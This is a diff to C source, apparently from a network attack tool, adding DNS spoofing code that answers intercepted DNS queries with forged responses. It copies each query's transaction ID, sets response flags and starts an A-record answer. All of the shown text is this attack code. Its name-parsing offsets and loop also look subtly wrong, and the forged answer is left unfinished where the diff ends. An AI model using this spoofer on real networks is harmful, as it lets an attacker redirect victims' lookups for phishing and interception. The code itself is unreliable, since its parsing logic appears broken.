@@ -336,12 +336,16 @@ void spoof_dns(int sock) {
     struct iphdr* ih = (struct iphdr*) (buffer + sizeof(struct ether_header));
     struct udphdr* uh
             = (struct udphdr*) (buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
+    unsigned char* data
+            = (buffer + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr));
 
     unsigned char recv_buffer[65535];
     struct ether_header* recv_eh = (struct ether_header*) recv_buffer;
     struct iphdr* recv_ih = (struct iphdr*) (recv_buffer + sizeof(struct ether_header));
     struct udphdr* recv_uh
             = (struct udphdr*) (recv_buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
+    unsigned char* recv_data = (recv_buffer + sizeof(struct ether_header) + sizeof(struct iphdr)
+            + sizeof(struct udphdr));
 
     //Initial constant packet settings
     //Zero buffer for defaults
@@ -351,7 +355,7 @@ void spoof_dns(int sock) {
     memcpy(eh->ether_shost, gateway_mac, ETHER_ADDR_LEN);
 
     int size;
-    int data_len = 20;
+    int data_len = 60;
     while ((size = read(sock, recv_buffer, 65535)) > 0) {
         if (ntohs(recv_uh->dest) != 53 || ntohs(recv_uh->source) == 53) {
             continue;
@@ -376,7 +380,6 @@ void spoof_dns(int sock) {
         ih->check = 0;
         ih->check = csum((unsigned short*) ih, sizeof(struct iphdr));
 
-#if 1
         //UDP stuffs
         uh->source = recv_uh->dest;
         uh->dest = recv_uh->source;
@@ -385,7 +388,39 @@ void spoof_dns(int sock) {
         //Calculate udp checksum
         uh->check = 0;
         uh->check = htons(ntohs(udp_checksum(uh, data_len, ih->saddr, ih->daddr)) - 8);
-#endif
+
+        //DNS stuffs
+        //Transaction ID
+        memcpy(data, recv_data, 2);
+        //Set response flags to 0x8180
+        data[2] = 0x81;
+        data[3] = 0x80;
+
+        //Copy number of questions
+        memcpy(data + 4, recv_data + 4, 2);
+
+        //1 answer RR
+        data[6] = 0x00;
+        data[7] = 0x01;
+
+        //Zero authority or additional RR
+        memset(data + 8, 0, 4);
+
+        //Time to parse question string
+        int name_len = 0;
+        for (;;) {
+            if (recv_data[11 + name_len] == 0x00) {
+                break;
+            }
+            name_len += recv_data[9 + name_len];
+        }
+        memcpy(data + 11, recv_data + 11, name_len);
+
+        //A record, IN address
+        data[11 + name_len + 0] = 0x00;
+        data[11 + name_len + 1] = 0x01;
+        data[11 + name_len + 2] = 0x00;
+        data[11 + name_len + 3] = 0x01;
 
         struct sockaddr_ll addr = {0};
         addr.sll_family = AF_PACKET;
